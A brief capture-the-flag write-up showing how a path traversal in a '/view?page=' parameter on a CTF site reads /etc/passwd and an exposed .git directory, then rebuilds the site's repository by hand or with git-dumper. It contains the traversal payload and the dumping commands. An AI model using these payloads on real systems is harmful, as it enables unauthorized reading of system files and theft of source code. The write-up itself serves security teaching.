/view?page= is vulnerable to path traversal and returns files from static. /view?page=../../../../etc/passwd

The about page tips off about .git being accessible with "Automated via Git-Hooks" 
After visiting ../.git/config, you can access all the information you need to reconstruct the git directory with: 

../.git/config
../.git/HEAD
../.git/index (recursively download all of the objects inside of this)

Alteratively, you could just run git-dumper against ../.git 
> git-dumper http://girlypop.ctf.rusec.club/../git/ dump_repo
